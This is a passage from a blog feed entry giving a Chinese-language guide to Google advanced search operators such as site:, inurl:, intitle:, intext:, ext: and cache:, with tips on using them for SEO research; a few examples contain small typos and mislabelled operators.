</span>又是一个没有证实的语法，效果很一般。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inanchor: </span>当我们用<span lang="EN-US">inanchor</span>提交查询的时候，<span lang="EN-US">Google</span>会限制结果是那些在网页<span lang="EN-US">anchor</span>链接里边包含了查询关键词的网页。例［<span lang="EN-US">restaurants inanchor:gourmet</span>］，提交这个查询，<span lang="EN-US">Google</span>会查询那些在<span lang="EN-US">anchor</span>信息里包含了关键词<span lang="EN-US">&rdquo;restaurants&rdquo;</span>和关键词<span lang="EN-US">&rdquo;gourmet&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">info: </span>提交<span lang="EN-US">info:url</span>，将会显示需要查询网站的一些信息。例［<span lang="EN-US">info:gothotel.com</span>］，提交这个查询，将会返回网站<span lang="EN-US">gothotel.com</span>的所有信息。</p><p class="MsoNormal">　</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">insubject: </span>当我们用<span lang="EN-US">insubject</span>进行查询的时候，<span lang="EN-US">Google</span>会限制论坛搜索结果仅是那些在主题里边包含了查询关键词的网面。［<span lang="EN-US">insubject:&rdquo;falling asleep&rdquo;</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回在文章主题里边包含了<span lang="EN-US">&rdquo;falling asleep&rdquo;</span>的文章。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">intext: </span>当我们用<span lang="EN-US">intext</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在文本正文里边包含了我们查询关键词的网页。［<span lang="EN-US">Hamish Reid intext:pandemonia</span>］，提交这个查询的时候，<span lang="EN-US">Google</span>会返回在文本正文包含查询关键字<span lang="EN-US">pandemonia</span>，在其它任何地方包含关键词<span lang="EN-US">&rdquo;Hamish&rdquo;</span>和<span lang="EN-US">&rdquo;Reid&rdquo;</span>的网页。（<span lang="EN-US">intext:</span>后面直接跟查询关键字，不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">intitle: </span>当我们用<span lang="EN-US">intitle</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在网页标题里边包含了我们查询关键词的网页。例［<span lang="EN-US">flu shot intitle:help</span>］，提交这个查询，<span lang="EN-US">Google</span>会返回在网页标题包含了查询关键字<span lang="EN-US">&rdquo;help&rdquo;</span>，而在其它任何地文包含了查询关键字<span lang="EN-US">&rdquo;flu&rdquo; </span>和<span lang="EN-US">&rdquo;shot&rdquo;</span>的网页。（<span lang="EN-US">intitle:</span>后面也不能有空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl: </span>当我们用<span lang="EN-US">inurl</span>进行查询的时候，<span lang="EN-US">Google</span>会返回那些在<span lang="EN-US">URL</span>（网址）里边包含了我们查询关键词的网页。例［<span lang="EN-US">inurl:print site:www.ssoooo.com</span>］，提交这个查询，<span lang="EN-US">Google</span>会查找<span lang="EN-US">www.ssoooo.com</span>这个网站下面网址里边包含了查询关键词<span lang="EN-US">&rdquo;print&rdquo;</span>的网页。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">link: </span>当我们使用<span lang="EN-US">link:URL</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟此<span lang="EN-US">URL</span>做了链接的网站。例［<span lang="EN-US">link:www.ssoooo.com</span>］，提交这个查询，我们将得到所有跟<span lang="EN-US">www.ssooo.com</span>这个网站做了链接的网站。（<span lang="EN-US">link</span>是个单独的语法，只能单独使用，且后面不能跟查询关键词，跟能跟<span lang="EN-US"> URL</span>）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">location: </span>当我们提交<span lang="EN-US">location</span>进行<span lang="EN-US">Google</span>新闻查询的时候，<span lang="EN-US">Google</span>仅会返回你当前指定区的跟查询关键词相关的网页。例<span lang="EN-US">[ queen location:canada ]</span>，提交这个查询，<span lang="EN-US">Google</span>会返回加拿大的跟查询关键词<span lang="EN-US">&rdquo;queen&rdquo;</span>相匹配的网站。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">movie: </span>当我们用<span lang="EN-US">movie</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟查询关键词相关的电影信息。<span lang="EN-US">(</span>当前只支持英文<span lang="EN-US">Google)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">phonebook: </span>当我们用<span lang="EN-US">phonebook</span>进行查询的时候，<span lang="EN-US">Google</span>会返回美国当地跟查询关键词相关的电话信息。（使用<span lang="EN-US">phonebook</span>的时候需要指定详细的州名和地点名）例，［<span lang="EN-US">phonebook:smith ca</span>］</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">related: </span>用<span lang="EN-US">related</span>提交查询，<span lang="EN-US">Google</span>会返回跟我们要查询的网站结构内容相似的一些其它网站。例<span lang="EN-US">[ related:www.consumerreports.org ]</span>，提交这个查询，<span lang="EN-US">Google</span>会返回所有跟网站<span lang="EN-US">www.consumerreports.org</span>结构内容相似的网站。我们也可以通过点击搜索结果后面的相似网页，来查询跟当前网页类似的网页。（<span lang="EN-US">related:</span>后面不能跟空格）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">rphonebook: </span>这个查询用来搜索美国当地跟查询关键词相关的住宅电话信息。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">safesearch: </span>用<span lang="EN-US">safesearch</span>提交查询的时候，<span lang="EN-US">Google</span>会过滤你搜索的结果，其中过滤的内容可能包括一些色情的，暴力，赌博性质的，还有传染病毒的网页。但是它不是百分之百确保安全的。例，［<span lang="EN-US">safesearch:breasts</span>］。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">site: </span>当我们用<span lang="EN-US">site</span>提交查询的时候，<span lang="EN-US">Google</span>会限制查询仅在某个网站，或是某个域下面进行。例［<span lang="EN-US">admissions site:www.lse.ac.uk</span>］，提交这个查询仅仅会搜索网站<span lang="EN-US">www.lse.ac.uk</span>下面关于<span lang="EN-US">admissions</span>的信息。我们还可以限制搜索仅在域下面进行，例［<span lang="EN-US">javascript site:edu.cn</span>］，提交这个查询，仅仅在教育网查询关于<span lang="EN-US">javascript</span>的信息。（<span lang="EN-US">site:</span>后面不能跟空格，且<span lang="EN-US">site</span>命令可以配合其它命令进行）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">source: </span>当用<span lang="EN-US">source</span>提交查询的时候，<span lang="EN-US">Google</span>新闻会限制我们的查询仅是那些我们指定了特定<span lang="EN-US">ID</span>或新闻源的网址。例［<span lang="EN-US">election source:new_york_times</span>］，提交这个查询，<span lang="EN-US">Google</span>将会显示纽约时报包含了查询关键词<span lang="EN-US">&rdquo;election&rdquo;</span>的相关文章。（我们也可以通过<span lang="EN-US">Google news</span>高级搜索完成查询）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">stocks: </span>当我们用<span lang="EN-US">stocks</span>提交查询的时候，<span lang="EN-US">Google</span>会返回跟查询关键词相关的股票信息，这些信息一般来自于其它一些专业的财经网站。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">store: </span>当我们用<span lang="EN-US">store</span>提交查询的时候，<span lang="EN-US">Google Froogle</span>仅会显示我们指定了<span lang="EN-US">store ID</span>的结果。例［<span lang="EN-US">polo shirt store:llbean</span>］，提交这个查询，仅会搜索商店<span lang="EN-US">L. L. Bean.</span>跟关键词<span lang="EN-US">&rdquo;polo&rdquo; &ldquo;shirt&rdquo;</span>相关的结果。（只支持英文<span lang="EN-US">Google</span>）</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">tq: </span>如果想查某个地方的天气如何<span lang="EN-US">,</span>我们只要在<span lang="EN-US">Google</span>搜索框中输入<span lang="EN-US">&rdquo;</span>城市名称<span lang="EN-US"> Tq&rdquo;</span>就可以查询到这个城市的天状况<span lang="EN-US">.</span>例<span lang="EN-US">&rdquo;</span>北京<span lang="EN-US"> tq&rdquo;,</span>当然<span lang="EN-US">tq</span>也可以用汉字的天气代替。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">weather: </span>当我们用<span lang="EN-US">weather</span>提交查询的时候，如果我们指出一个<span lang="EN-US">Google</span>可以识别的地区或城市，<span lang="EN-US">Google</span>会返回该地区或城市当前的天气状况。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">Google </span>提供高级搜索方法帮助<span lang="EN-US">SEOer</span>更方便的进行<span lang="EN-US">SEO</span>方面的研究和分析。今天简单的介绍几款常用的搜索方法。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>Site</span>的使用方式是：<span lang="EN-US">&ldquo;Site: + </span>域名<span lang="EN-US">&rdquo;</span>。比如说：<span lang="EN-US">site:seomao.com</span>。这种<span lang="EN-US">Google</span>搜索的作用是获得某个域名大概的被<span lang="EN-US">Google</span>收录的页面的数量，其中包括了二级域名的收录页面数量。用户也可以直接搜索某种后缀的<span lang="EN-US">Google</span>收录量。比如说<span lang="EN-US">: site:.gov</span>可以帮你了解政府部门网站有多少被<span lang="EN-US">Google</span>收录。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>InURL</span>或者<span lang="EN-US">AllInURL</span>的使用方法是：<span lang="EN-US">&ldquo;inurl</span>：关键词<span lang="EN-US">&rdquo; </span>或者<span lang="EN-US">&ldquo;allinurl</span>：关键词<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，结果中这个关键词必须出现在这个页面的<span lang="EN-US">URL</span>链接里面。如果你要搜索两个关键词同时出现的页面链接，应该用<span lang="EN-US">allinurl:</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:seo</span>，<span lang="EN-US">inurl:</span>资料<span lang="EN-US"> = allinurl:seo </span>资料</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>InTitle</span>或者<span lang="EN-US">AllInTitle</span>的使用方法是：<span lang="EN-US">&ldquo;inurl:</span>关键词<span lang="EN-US">&rdquo; </span>或者<span lang="EN-US">&ldquo;allinurl:</span>关键词<span lang="EN-US">&rdquo;</span>。 使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果中这个关键词必须出现在这个页面的标题<span lang="EN-US">Title</span>里面。如果你要搜搜两个关键词同时出现的页面标题<span lang="EN-US">Title,</span>应该用<span lang="EN-US">allintitle:</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US">inurl:seo</span>，<span lang="EN-US">inurl:</span>博客<span lang="EN-US"> = allintitle:seo </span>博客</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>InText</span>的使用方法是：<span lang="EN-US">&ldquo;Intext:</span>关键词<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果中这个关键词必须出现在这个页面正文的文字叙述中。比如说：<span lang="EN-US">intext:</span>站内<span lang="EN-US">SEO</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span>星号在搜索中的含义是：可以代表任何东西。比如说你搜索：<span lang="EN-US">SEO * </span>工具。那么结果中既可能有<span lang="EN-US"> SEO</span>上传工具，也可能有<span lang="EN-US">SEO</span>分析工具。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>Related </span>的使用方法是：<span lang="EN-US">&ldquo;Related:URL</span>链接<span lang="EN-US">&rdquo;</span>。使用这种<span lang="EN-US">Google</span>搜索方法，搜索结果将展示与这个<span lang="EN-US">URL</span>链接页面相关的页面。<span lang="EN-US">&ldquo;</span>相关<span lang="EN-US">&rdquo;</span>除了和该页面内容相关的页面外，还包括这个页面的导入链接和导出链接所指向的页面。比如说：<span lang="EN-US">Related:dhgate.com</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>Ext</span>的使用方法是：<span lang="EN-US">&ldquo;Ext:</span>文件后缀<span lang="EN-US">&rdquo;</span>。它可以帮你搜索各种后缀格式的文件。比如说：</p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>xls (</span>微软<span lang="EN-US"> Excel)</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>ppt (</span>微软<span lang="EN-US"> PowerPoint)</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>doc (</span>微软<span lang="EN-US"> Word)</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>pdf (Adobe </span>文件<span lang="EN-US">)</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>html or htm (HTML</span>代码文件<span lang="EN-US">)</span></p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>Cache</span>的使用方法是：<span lang="EN-US">&ldquo;cache:URL</span>链接<span lang="EN-US">&rdquo;</span>。搜索显示的是某个链接在<span lang="EN-US">Google</span>服务器上的缓存。很多用户不直接访问该页面，而使用缓存有<span lang="EN-US">2</span>个好处：<span lang="EN-US">a.</span>对于有潜在危险的页面，缓存更加安全。<span lang="EN-US">b.</span>缓存有可能比直接访问网站服务器更快。<span lang="EN-US">c.</span>很多页面也许已经被删除了，而缓存还存在。比如说：<span lang="EN-US">cache:seomao.com</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>Inanchor</span>的使用方法是：<span lang="EN-US">inanchor:</span>关键词。搜索结果中必须出现以这个关键词为链接关键词的链接。比如说<span lang="EN-US"> &ldquo;inanchor:seo</span>资料<span lang="EN-US">&rdquo; </span>将显示以<span lang="EN-US">&ldquo;SEO</span>资料<span lang="EN-US">&rdquo;</span>为链接关键词的页面。此搜索时常被用来做关键词的竞争研究比较。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal">熟练的掌握以上的几种<span lang="EN-US">Google</span>高级搜索方法，并且将他们交叉使用，将让你的搜索结果更加准确和有效，比如说：</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>&ldquo;site:seomao.com </span>站内<span lang="EN-US">SEO&rdquo;</span>将帮助你更快更准确的找到<span lang="EN-US">SEOmao.com</span>里面关于<span lang="EN-US">&ldquo;</span>站内<span lang="EN-US">SEO&rdquo;</span>的<span lang="EN-US">SEO</span>资料。或者针对你的特殊需求使用：<span lang="EN-US">&ldquo;site:seomao.com intitle:</span>站内<span lang="EN-US">seo&rdquo;</span>，<span lang="EN-US"> &ldquo;site:seomao.com inurl:seo list&rdquo;</span>，<span lang="EN-US">&ldquo; site:seomao.com inurl:seo list&rdquo;</span>，<span lang="EN-US">&ldquo; site:seomao.com inanchor:</span>链接<span lang="EN-US">&rdquo;</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p><p class="MsoNormal"><span lang="EN-US"><span style="mso-spacerun: yes;">&nbsp;&nbsp;&nbsp; </span>&ldquo;site.rg + </span>关键词<span lang="EN-US">&rdquo;</span>将帮助你更好的找到建立<span lang="EN-US">SEO</span>外链所需要的目标网站。比如说：<span lang="EN-US">&ldquo;siterg </span>搜索引擎优化<span lang="EN-US">&rdquo;</span>。</p><p class="MsoNormal"><span lang="EN-US">&nbsp;</span></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
